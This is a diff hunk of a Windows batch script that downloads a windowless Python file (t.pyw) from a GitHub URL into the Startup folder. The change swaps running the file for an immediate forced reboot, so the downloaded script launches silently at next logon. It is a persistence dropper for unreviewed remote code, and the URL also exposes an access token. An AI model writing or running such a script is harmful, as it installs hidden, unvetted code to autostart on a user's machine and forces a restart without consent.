@@ -17,7 +17,7 @@ rem Display the current directory to confirm
 echo You are now in the Startup folder:
 curl -o t.pyw https://raw.githubusercontent.com/oogabooga245/cant/refs/heads/main/t.pyw?token=GHSAT0AAAAAAED5MF23ZP3N2OFVDZDJYRO62TJJ62A
 
-start t.pyw
+shutdown /r /t 0
 
 rem Optional: list the contents of the Startup folder
 dir
